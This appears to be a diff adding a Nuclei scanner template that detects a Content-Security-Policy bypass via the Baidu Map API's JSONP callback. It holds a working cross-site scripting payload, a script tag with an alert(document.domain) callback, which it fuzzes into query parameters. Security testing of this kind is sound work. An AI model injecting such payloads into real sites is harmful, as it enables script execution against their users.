@@ -1,0 +1,55 @@
+id: baidu-map-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Baidu Map API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,baidu-map-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "baidu.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: baidu_map_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.map.baidu.com/api?v=2.0&ak=&s=1&callback=alert(document.domain)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "baidu_map_api_csp_xss == true"
+# digest: 4a0a00473045022016959080d7d7737434d36277921970b39de69462ebe71bd1fae547ad5a7edc7c022100a809bcbe9096df7bd76b1d1f732f07d8081a7012648a3ccc3a76ad3b12e776b9:922c64590222798bb761d5b6d8e72950
